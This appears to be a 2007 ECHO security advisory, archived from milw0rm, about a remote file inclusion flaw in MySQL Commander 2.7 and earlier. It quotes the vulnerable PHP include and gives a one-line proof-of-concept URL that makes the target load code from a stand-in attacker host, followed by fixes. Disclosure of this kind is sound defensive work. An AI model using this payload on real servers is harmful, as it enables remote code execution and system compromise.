@@ -1,0 +1,93 @@
+____________________   ___ ___ ________
+\_   _____/\_   ___ \ /   |   \\_____  \  
+ |    __)_ /    \  \//    ~    \/   |   \ 
+ |        \\     \___\    Y    /    |    \
+/_______  / \______  /\___|_  /\_______  /
+        \/         \/       \/         \/ 
+
+                                        .OR.ID
+ECHO_ADV_73$2007
+
+-----------------------------------------------------------------------------------------
+[ECHO_ADV_73$2007] MySQL Commander <= 2.7 (home) Remote File Inclusion Vulnerability
+-----------------------------------------------------------------------------------------
+
+Author         : M.Hasran Addahroni
+Date           : March, 13th 2007
+Location       : Australia, Sydney
+Web            : http://advisories.echo.or.id/adv/adv73-K-159-2007.txt
+Critical Lvl   : Dangerous
+Impact	       : System access
+Where	       : From Remote
+---------------------------------------------------------------------------
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Application   : MySQL Commander 
+version       : <= 2.7
+Vendor        : http://www.bitesser.de/freeware/script.php?id=1
+Description :
+
+A small tool to backup and restore MySQL Tables. Features: backup/restore of binaries; parametric backup; multiserver; Gzipping; killing of backup files; german/english; Online help in popup.
+This tool makes backups of all the tables in a database. The data will be stored in textfiles located in the "data"directory. You can backup and restore the "SQL create table command" and the "content". So you can easily make copies of your tables. (i.e. copy a hole database with a few clicks).
+You will need PHP since version 4.1 and MySQL since Version 3.23
+
+---------------------------------------------------------------------------
+
+Vulnerability:
+~~~~~~~~~~~~~
+- Invalid include function at ressourcen/dbopen.php :  
+  	
+----------------ressourcen/dbopen.php-------------------
+<?php
+include $home."ressourcen/class.systemObject.php";
+include $home."ressourcen/class.DatabaseMysql.php";
+$db = new DatabaseMysql($config->dbuser[$_SESSION['which_db']], $config->dbpass[$_SESSION['which_db']], $config->dbserver[$_SESSION['which_db']]);
+$ok = $db->init();
+
+if (!$ok and $db->error and (strlen($config->dbserver[1]) > 0)) {
+	echo $db->getError();
+}
+
+?>
+----------------------------------------------------------------
+
+
+Variables $home is not properly sanitized.
+When register_globals=on and allow_fopenurl=on an attacker can exploit this vulnerability with a simple php injection script.
+
+
+Poc/Exploit:
+~~~~~~~~~
+
+http://www.target.com/[mysqlcommander_path]/ressourcen/dbopen.php?home=http://attacker.com/evil?
+
+
+Solution:
+~~~~~~
+
+- Sanitize variable $home on affected file.
+- Turn off register_globals
+
+---------------------------------------------------------------------------
+
+Shoutz:
+~~~~
+~ ping - my dearest wife, and my little son, for all the luv the tears n the breath
+~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,negative, str0ke (for the best comments)
+~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,an0maly,fleanux,baylaw
+~ SinChan,h4ntu,cow_1seng,sakitjiwa, m_beben, rizal, cR4SH3R, madkid, kuntua, stev_manado, nofry, x16
+~ newbie_hacker@yahoogroups.com
+~ #aikmel #e-c-h-o @irc.dal.net
+
+---------------------------------------------------------------------------
+Contact:
+~~~~~
+
+     K-159 || echo|staff || eufrato[at]gmail[dot]com
+     Homepage: http://k-159.echo.or.id/
+
+-------------------------------- [ EOF ] ----------------------------------
+
+# milw0rm.com [2007-03-13]
